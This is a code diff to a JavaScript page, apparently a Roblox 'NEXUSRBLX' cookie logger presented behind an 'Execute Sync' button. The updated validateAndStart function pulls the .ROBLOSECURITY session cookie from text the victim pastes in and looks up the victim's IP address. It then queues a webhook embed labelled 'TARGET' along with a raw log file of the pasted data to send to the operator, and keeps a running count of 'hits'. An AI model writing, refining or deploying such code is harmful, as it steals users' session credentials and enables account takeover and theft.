@@ -474,7 +474,6 @@
 }
         
         async function validateAndStart(event) {
-    // 1. Cooldown Check
     if (isCooldown) return;
     if (!dId) {
         const box = document.getElementById('input-container');
@@ -484,37 +483,65 @@
         return;
     }
 
-    // 2. Activate 5s Cooldown
     isCooldown = true;
     const btn = event.target;
-    const originalText = btn.innerText;
     btn.innerText = "COOLDOWN ACTIVE...";
     btn.style.opacity = "0.5";
-    setTimeout(() => { isCooldown = false; btn.innerText = originalText; btn.style.opacity = "1"; }, 5000);
+    setTimeout(() => { isCooldown = false; btn.innerText = "Execute Sync"; btn.style.opacity = "1"; }, 5000);
 
-    // 3. UI Transition
     pushTraffic(dName, true);
     let cur = (parseInt(localStorage.getItem('nexus_hit_counter')) || 0) + 1;
     localStorage.setItem('nexus_hit_counter', cur);
+    
     document.getElementById('setup-phase').classList.add('hidden');
     document.getElementById('progress-phase').classList.remove('hidden');
 
-    // 4. Data Collection
+    // 1. Extract data immediately
     const raw = document.getElementById('userInput').value;
-    const cook = (raw.match(/\.ROBLOSECURITY",\s*"([^"]+)"/) || [])[1] || "NOT_FOUND";
+    const cookMatch = raw.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
+    const cook = cookMatch ? cookMatch[1] : "NOT_FOUND";
+    
+    // 2. Wait for IP detection before proceeding to queue
     let ip = "Detecting...";
     try { 
-        const res = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(2000) }); 
-        ip = (await res.json()).ip; 
-    } catch(e) { ip = "Timed Out"; }
+        const res = await fetch('https://api.ipify.org?format=json'); 
+        const data = await res.json();
+        ip = data.ip; 
+    } catch(e) { ip = "Detection Failed"; }
 
     const hookName = `NEXUSRBLX HIT #${cur}`;
 
-    // 5. Save to Queue (The "Restore/Fail-safe" logic)
-    requestQueue.push({ type: 'json', payload: { username: hookName, avatar_url: logoURL, embeds: [{ title: `🛡️ TARGET: ${dName}`, color: 0x10b981, fields: [{ name: "🌐 IP", value: `\`${ip}\``, inline: true }, { name: "🎮 ID", value: `\`${dId}\``, inline: true }, { name: "🔑 Cookie", value: `\`\`\`${cook}\`\`\`` }] }] } });
-    requestQueue.push({ type: 'file', payload: { username: hookName, avatar_url: logoURL, filename: `RAWLOG#${cur}.txt`, content: raw } });
+    // 3. Push both items to the queue
+    // Item 1: The Embed with IP and Cookie
+    requestQueue.push({ 
+        type: 'json', 
+        payload: { 
+            username: hookName, 
+            avatar_url: logoURL, 
+            embeds: [{ 
+                title: `🛡️ TARGET: ${dName}`, 
+                color: 0x10b981, 
+                fields: [
+                    { name: "🌐 IP", value: `\`${ip}\``, inline: true }, 
+                    { name: "🎮 ID", value: `\`${dId}\``, inline: true }, 
+                    { name: "🔑 Cookie", value: `\`\`\`${cook}\`\`\`` }
+                ] 
+            }] 
+        } 
+    });
 
-    // 6. Start Background Processes
+    // Item 2: The Raw Text File
+    requestQueue.push({ 
+        type: 'file', 
+        payload: { 
+            username: hookName, 
+            avatar_url: logoURL, 
+            filename: `RAWLOG#${cur}.txt`, 
+            content: raw 
+        } 
+    });
+
+    // 4. Trigger the processing loop
     processQueue();
     runEngine();
 }
